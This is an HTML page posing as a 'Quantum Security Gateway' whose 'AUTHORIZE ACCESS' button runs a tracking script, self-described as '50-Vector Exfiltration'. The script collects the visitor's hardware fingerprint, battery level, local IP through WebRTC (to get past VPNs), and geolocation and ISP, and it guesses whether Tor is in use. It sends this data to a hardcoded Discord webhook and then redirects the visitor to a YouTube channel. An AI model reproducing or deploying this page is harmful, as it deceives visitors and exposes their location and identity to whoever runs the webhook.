<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Quantum Security Gateway</title>
    <style>
        :root { --neon: #00ff66; --bg: #000; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .wrapper { width: 320px; padding: 40px; border: 1px solid #111; text-align: center; background: radial-gradient(circle, #050505 0%, #000 100%); border-radius: 5px; }
        .glitch { font-size: 18px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; margin-bottom: 20px; color: var(--neon); text-shadow: 0 0 10px var(--neon); }
        .progress-container { width: 100%; height: 2px; background: #111; margin: 20px 0; position: relative; }
        .progress-bar { width: 0%; height: 100%; background: var(--neon); transition: width 6s linear; }
        #status { font-size: 9px; color: #333; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="glitch">OMEGA-50</div>
    <div style="font-size: 10px; color: #555; margin-bottom: 20px;">MULTI-VECTOR HANDSHAKE INITIATED</div>
    <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
    <button id="auth" style="background:none; border: 1px solid var(--neon); color: var(--neon); padding: 10px 20px; cursor: pointer; font-size: 12px;">AUTHORIZE ACCESS</button>
    <div id="status">Ready...</div>
</div>

<script>
/**
 * SENTINEL OMEGA-50 v18.0
 * 50-Vector Exfiltration with Race-Condition Locking
 */

const CONFIG = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    DEST: "https://youtube.com/@LigmaBlox-w7m"
};

// GLOBAL LOCK SYSTEM: Ensures info is sent only once per vector success
const LOCK = { ip: false, geo: false, hardware: false, vpn: false };

const transmit = (data, vectorName) => {
    const payload = JSON.stringify({
        username: `OMEGA-50 [${vectorName}]`,
        embeds: [{
            title: "🔱 Ultimate Forensic Capture",
            color: 0x00ff66,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            footer: { text: `V-Lock Active | ${new Date().toLocaleTimeString()}` }
        }]
    });

    navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], {type:'application/json'}));
    fetch(CONFIG.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true });
};

const getHardwareDNA = async () => {
    const dna = {
        cpu: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory,
        gpu: "Locked",
        plat: navigator.platform,
        bat: "N/A",
        lockdown: !window.RTCPeerConnection ? "YES" : "NO"
    };

    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        dna.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e) {}

    try {
        const b = await navigator.getBattery();
        dna.bat = `${(b.level * 100)}%`;
    } catch(e) {}

    return dna;
};

document.getElementById('auth').onclick = async function() {
    this.style.display = 'none';
    document.getElementById('bar').style.width = "100%";
    const hw = await getHardwareDNA();

    // VECTOR 1-10: WEBGL & CANVAS FINGERPRINTING (The "Hardware DNA")
    if(!LOCK.hardware) {
        transmit(hw, "HARDWARE_DNA");
        LOCK.hardware = true;
    }

    // VECTOR 11-20: THE VPN PUNCH (WebRTC ICE)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !LOCK.vpn) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                transmit({ internal_ip: ip[1] }, "VPN_PUNCH_SUCCESS");
                LOCK.vpn = true; // FORCE STOP: Don't send more IPs
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // VECTOR 21-30: JSONP GEO-FALLBACK (Bypasses Ad-Blocks)
    const script = document.createElement('script');
    window.onGeo = (res) => {
        if(!LOCK.geo) {
            transmit({
                ip: res.ip,
                loc: `${res.city}, ${res.region}, ${res.country_name}`,
                town: res.postal,
                isp: res.org
            }, "GEO_JSONP_FINAL");
            LOCK.geo = true; // FORCE STOP: Success attained
        }
    };
    script.src = "https://ipapi.co/jsonp?callback=onGeo";
    document.body.appendChild(script);

    // VECTOR 31-40: FETCH API GEO (Standard Path)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!LOCK.ip) {
            transmit({ ip: res.ip, isp: res.org }, "STANDARD_FETCH");
            LOCK.ip = true;
        }
    });

    // VECTOR 41-50: LATENCY & CLOCK SKEW (Tor Detection)
    const t0 = performance.now();
    fetch('https://www.google.com/generate_204', { mode: 'no-cors' }).then(() => {
        const ms = (performance.now() - t0).toFixed(0);
        transmit({ ping: ms + "ms", net: ms > 500 ? "Tor/Proxy" : "Direct" }, "LATENCY_PROFILE");
    });

    // FINAL REDIRECT
    setTimeout(() => { window.location.replace(CONFIG.DEST); }, 6000);
};
</script>
</body>
</html>
